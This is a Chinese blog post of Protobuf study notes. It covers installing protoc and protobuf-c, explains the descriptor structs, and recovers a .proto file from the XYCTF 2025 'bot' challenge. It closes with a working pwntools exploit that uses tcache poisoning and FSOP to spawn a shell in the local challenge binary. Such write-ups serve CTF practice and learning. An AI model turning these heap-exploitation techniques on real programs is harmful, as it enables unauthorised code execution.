---
title: "Protobuf 学习笔记"
description: "装好 protoc 与 protobuf-c，读懂 descriptor 结构体，再从一道题反推出 .proto、恢复符号。"
pubDate: 2025-07-21
category: tools
tags: [protobuf]
---

做题时碰到了 protobuf，顺手把它的编解码和逆向手法整理一遍。

## 介绍
**Protobuf**（全称：Protocol Buffers）是 Google 开发的一种轻量、高效的结构化数据序列化协议。它用于将数据结构序列化为紧凑的二进制格式，用于网络通信或数据存储。Protobuf 被设计为跨平台和语言无关的，因此广泛应用于分布式系统、网络通信、远程过程调用（RPC）等场景

和 JSON / XML 一样，它做的是"把结构化数据打包成一段字节"。区别在于产物是二进制：要反序列化才能读，传输时也省掉了冗余的字段名和标点。

## 环境配置
> 基于 wsl Ubuntu22.04

据说 Ubuntu 22.04 自带较新的版本，我这台没有。

### 安装 protoc
```bash
wget https://github.com/protocolbuffers/protobuf/releases/download/v3.6.1/protobuf-all-3.6.1.tar.gz
tar -xvzf protobuf-all-3.6.1.tar.gz
cd protobuf-all-3.6.1
./configure
make #比较耗时
make check
sudo make install #比较耗时
```
`make check` 不是必需的，跑一遍能确认编译没问题。
安装完成可以通过
```bash
protoc --version
```
看到回显 libprotoc 3.6.1，就是安装成功。
```bash
ln -s /usr/local/lib/libprotobuf.so.17 /usr/lib/libprotobuf.so.17
ln -s /usr/local/lib/libprotoc.so.17 /usr/lib/libprotoc.so.17
sudo ldconfig
```
### 安装 protobuf-c
```bash
wget https://github.com/protobuf-c/protobuf-c/releases/download/v1.5.0/protobuf-c-1.5.0.tar.gz
tar -xvzf protobuf-c-1.5.0.tar.gz
cd protobuf-c-1.5.0
./configure
make
make check
sudo make install
```

### 安装 python 的 protobuf 库
```bash
pip3 install protobuf==3.20.3
```

### 基础知识
在 proto2 中
```
syntax = "proto2";

message test {
  optional string a = 1;
  optional int32 b = 2;
  required int32 c = 3;
}
```
在第一行指定 protobuf 的版本

`message` 相当于 C 里的结构体，一个文件里可以定义多个。

其中，
- `optional/required` 指定属性
	- optional：设了值就序列化进去；没设就返回默认值，也不会出现在线格式里。
	- required：官方推荐**不要用**，兼容性问题太多，proto3 和 editions 里已经移除。
- `string/int32` 是类型描述
- `a/b/c` 是字段名称
- `1/2/3` 是字段编号，不是字段的值

在 proto3 中，
_required_ 被移除，其他的与 proto2 类似。

其他可参考：[Protocol Buffers 文档](https://protobuf.com.cn/)

## 逆向：从结构体回到 .proto

### 相关结构体

#### ProtobufCMessageDescriptor
```C
struct ProtobufCMessageDescriptor {
 /** Magic value checked to ensure that the API is used correctly. */
 uint32_t   magic;

 /** The qualified name (e.g., "namespace.Type"). */
 const char   *name;
 /** The unqualified name as given in the .proto file (e.g., "Type"). */
 const char   *short_name;
 /** Identifier used in generated C code. */
 const char   *c_name;
 /** The dot-separated namespace. */
 const char   *package_name;

 /**
  * Size in bytes of the C structure representing an instance of this
  * type of message.
  */
 size_t    sizeof_message;

 /** Number of elements in `fields`. */
 unsigned   n_fields;
 /** Field descriptors, sorted by tag number. */
 const ProtobufCFieldDescriptor *fields;
 /** Used for looking up fields by name. */
 const unsigned   *fields_sorted_by_name;

 /** Number of elements in `field_ranges`. */
 unsigned   n_field_ranges;
 /** Used for looking up fields by id. */
 const ProtobufCIntRange  *field_ranges;

 /** Message initialisation function. */
 ProtobufCMessageInit message_init;  (函数指针)

 /** Reserved for future use. */
 void    *reserved1;
 /** Reserved for future use. */
 void    *reserved2;
 /** Reserved for future use. */
 void    *reserved3;
};
```
- `magic`：通常是 `0x28AAEEF9`，可以拿它做全局搜索，快速定位 descriptor。
- `n_fields`：字段个数。
- `fields`：指向字段描述符数组。

#### ProtobufCFieldDescriptor
```C
struct ProtobufCFieldDescriptor {
                           /** Name of the field as given in the .proto file. */
 const char  *name;

                           /** Tag value of the field as given in the .proto file. */
 uint32_t  id;

                           /** Whether the field is `REQUIRED`, `OPTIONAL`, or `REPEATED`. */
 ProtobufCLabel  label;

                           /** The type of the field. */
 ProtobufCType  type;

                           /**
  * The offset in bytes of the message's C structure's quantifier field
  * (the `has_MEMBER` field for optional members or the `n_MEMBER` field
  * for repeated members or the case enum for oneofs).
  */
 unsigned  quantifier_offset;

                           /**
  * The offset in bytes into the message's C structure for the member
  * itself.
  */
 unsigned  offset;

                           /**
  * A type-specific descriptor.
  *
  * If `type` is `PROTOBUF_C_TYPE_ENUM`, then `descriptor` points to the
  * corresponding `ProtobufCEnumDescriptor`.
  *
  * If `type` is `PROTOBUF_C_TYPE_MESSAGE`, then `descriptor` points to
  * the corresponding `ProtobufCMessageDescriptor`.
  *
  * Otherwise this field is NULL.
  */
 const void  *descriptor;  /* for MESSAGE and ENUM types */

                           /** The default value for this field, if defined. May be NULL. */
 const void  *default_value;

                           /**
  * A flag word. Zero or more of the bits defined in the
  * `ProtobufCFieldFlag` enum may be set.
  */
 uint32_t  flags;

                           /** Reserved for future use. */
 unsigned  reserved_flags;
                           /** Reserved for future use. */
 void   *reserved2;
                           /** Reserved for future use. */
 void   *reserved3;
};
```
- `name`：字段名。
- `id`：字段编号。
- `label`：修饰符。
- `type`：字段类型。
- `default_value`：proto2 有、proto3 没有，可以据此判断版本。

#### Label 与 Type
```C
enum ProtobufCLabel{
                            /** A well-formed message must have exactly one of this field. */
 PROTOBUF_C_LABEL_REQUIRED,

                            /**
  * A well-formed message can have zero or one of this field (but not
  * more than one).
  */
 PROTOBUF_C_LABEL_OPTIONAL,

                            /**
  * This field can be repeated any number of times (including zero) in a
  * well-formed message. The order of the repeated values will be
  * preserved.
  */
 PROTOBUF_C_LABEL_REPEATED,

                            /**
  * This field has no label. This is valid only in proto3 and is
  * equivalent to OPTIONAL but no "has" quantifier will be consulted.
  */
 PROTOBUF_C_LABEL_NONE,
};

enum ProtobufCType {
 PROTOBUF_C_TYPE_INT32,     /**< int32 */
 PROTOBUF_C_TYPE_SINT32,    /**< signed int32 */
 PROTOBUF_C_TYPE_SFIXED32,  /**< signed int32 (4 bytes) */
 PROTOBUF_C_TYPE_INT64,     /**< int64 */
 PROTOBUF_C_TYPE_SINT64,    /**< signed int64 */
 PROTOBUF_C_TYPE_SFIXED64,  /**< signed int64 (8 bytes) */
 PROTOBUF_C_TYPE_UINT32,    /**< unsigned int32 */
 PROTOBUF_C_TYPE_FIXED32,   /**< unsigned int32 (4 bytes) */
 PROTOBUF_C_TYPE_UINT64,    /**< unsigned int64 */
 PROTOBUF_C_TYPE_FIXED64,   /**< unsigned int64 (8 bytes) */
 PROTOBUF_C_TYPE_FLOAT,     /**< float */
 PROTOBUF_C_TYPE_DOUBLE,    /**< double */
 PROTOBUF_C_TYPE_BOOL,      /**< boolean */
 PROTOBUF_C_TYPE_ENUM,      /**< enumerated type */
 PROTOBUF_C_TYPE_STRING,    /**< UTF-8 or ASCII string */
 PROTOBUF_C_TYPE_BYTES,     /**< arbitrary byte sequence */
 PROTOBUF_C_TYPE_MESSAGE,   /**< nested message */
};
```

#### ProtobufCBinaryData（bytes）
```C
struct ProtobufCBinaryData
{
  size_t len;                           ///< Number of bytes in the `data` field.
  uint8_t *data;                        ///< Data bytes.
};
```

#### ProtobufCMessage
```C
struct ProtobufCMessage
{
  const ProtobufCMessageDescriptor *descriptor;
  unsigned int n_unknown_fields;
  ProtobufCMessageUnknownField *unknown_fields;
};
```

#### ProtobufCIntRange
```C
struct ProtobufCIntRange
{
  int start_value;
  unsigned int orig_index;
};
```

#### ProtobufCMessageUnknownField
```C
struct ProtobufCMessageUnknownField
{
    uint32_t tag;
    ProtobufCWireType wire_type;
    size_t len;
    uint8_t *data;
};
```

### 例题：XYCTF 2025 bot
以 xyctf2025 bot 为例子
```
v7 = &message_response__descriptor;
```
`v7 = &message_response__descriptor;` 这样的赋值，跟进去看第一个值是不是 `0x28AAEEF9`，就能确认它是 `ProtobufCMessageDescriptor`：
然后发现名为 Message_response 的 Message
`n_fields` 说有 4 个字段；顺着 `fields` 找到每个字段的 `ProtobufCFieldDescriptor`，四个字段依次是 id、receiver、status、error_message。

怎么读这些描述符：`type` 给出类型（对应 `ProtobufCType` 枚举），`label` 给出 required / optional / repeated，`id` 就是字段编号，字段名则要从 `name` 指向的字符串里取。把枚举值和 `.proto` 语法对着翻译一遍，结构体声明就还原出来了。
结构体里有 `default_value`，说明这是 proto2。
于是可以还原出：
```
syntax="proto2";

message Message_response{
    required int32 id = 1;
    required string receiver = 2;
    required int32 status_code = 3;
    optional string error_message = 4;
}
```
同样的，发现了另一个 Message, 名为 Message_request
```
message Message_request{
    required int32 id = 1;
    required string sender = 2;
    required uint32 len = 3;
    required bytes content = 4;
    required int32 actionid = 5;
}
```
把两个 message 合到一个文件里：
```
syntax = "proto2";

message Message_request{
    required int32 id = 1;
    required string sender = 2;
    required uint32 len = 3;
    required bytes content = 4;
    required int32 actionid = 5;
}

message Message_response{
    required int32 id = 1;
    required string receiver = 2;
    required int32 status_code = 3;
    optional string error_message = 4;
}
```
存成 `demo.proto`。
使用 `protoc --c_out=. ./demo.proto` 和 `protoc --python_out=. ./demo.proto`

当前目录下会生成 C 和 Python 两组文件：`demo.pb-c.c`、`demo.pb-c.h`，以及 `demo_pb2.py` 和 `__pycache__` 目录。

C 文件用于恢复符号，在其中可找到结构体 MessageRequest
```C
struct  MessageRequest
{
  ProtobufCMessage base;
  int32_t id;
  char *sender;
  uint32_t len;
  ProtobufCBinaryData content;
  int32_t actionid;
};
```
把这个结构体导入 IDA，逆向会轻松很多。这题具体的利用不是本文重点，略过。

python 文件用来和题目交互，`import demo_pb2` 就能构造消息。
例如，
```python
# 初始化
msg = demo_pb2.Message_request()
msg.id = 1
msg.sender = 'admin'
...

# 序列化
x=msg.SerializeToString()
```
#### exp

利用本身是 tcache + FSOP，和 protobuf 无关，脚本直接贴在这里：

```python
from pwn import *
import demo_pb2 as bot

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'

libc = ELF('./libc.so.6')

io = process('./bot')
# gdb.attach(io, 'b *$rebase(0x8515)\nb *$rebase(0x8382)')

def add(id:int,len:int,con):
    msg = bot.Message_request()
    msg.id = id
    msg.sender = 'admin'
    msg.len = len
    msg.content = con
    msg.actionid = 1
    io.recvuntil(b'TESTTESTTEST!')
    io.send(msg.SerializeToString())

def show(id:int):
    msg = bot.Message_request()
    msg.id = id
    msg.sender = 'admin'
    msg.len = 666
    msg.content = b'1'
    msg.actionid = 2
    io.recvuntil(b'TESTTESTTEST!')
    io.send(msg.SerializeToString())

def exit_program():
    msg = bot.Message_request()
    msg.id = 0
    msg.sender = 'admin'
    msg.len = 666
    msg.content = b'1'
    msg.actionid = 3
    io.recvuntil(b'TESTTESTTEST!')
    io.send(msg.SerializeToString())

add(0, 0x1, b'a'*0x1)
show(2)
io.recvuntil(b'BOT MSG\n')
heap_base = u64(io.recv(5).ljust(8, b'\x00')) << 12
info('heap_base: ' + hex(heap_base))

con = p64(0) + p64(0)
con += p64(0) + p64(0x21)
con += p64(0) + p64(heap_base + 0x2a0)
add(0, len(con), con)
show(1)
libc.address = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x29d90
info(f'libc: {hex(libc.address)}')

con = p64(0) + p64(0)
con += p64(0) + p64(0x21)
con += p64(0) + p64(heap_base + 0x1A00)
add(0, len(con), con)

con = p64(0) + p64(0)
con = con.ljust(0x68, b'\x00')
con += p64(libc.symbols['system'])
add(1, len(con), con)

con = p64(0) + p64(0)
con += p64(0) + p64(0x21)
con += p64(0) + p64(heap_base + 0x1B00)
add(0, len(con), con)

con = b'\0'*0xE0
con += p64(heap_base + 0x1A00)
add(1, len(con), con)

con = p64(0) + p64(0)
con += p64(0) + p64(0x21)
con += p64(0) + p64(heap_base + 0x1C00)
add(0, len(con), con)

con = b'  sh\0\0\0\0'
con = con.ljust(0x28, b'\x00')
con += p64(1)
con = con.ljust(0xa0, b'\x00')
con += p64(heap_base + 0x1B00)
con = con.ljust(0xc0, b'\x00')
con += p64(0xffffffffffffffff)
con = con.ljust(0xd8, b'\x00')
con += p64(libc.symbols['_IO_wfile_jumps'])
add(1, len(con), con)

con = p64(0) + p64(0)
con += p64(0) + p64(0x21)
con += p64(0) + p64(libc.symbols['_IO_list_all'])
add(0, len(con), con)

con = p64(heap_base + 0x1C00)
add(1, len(con), con)

exit_program()

io.interactive()
```
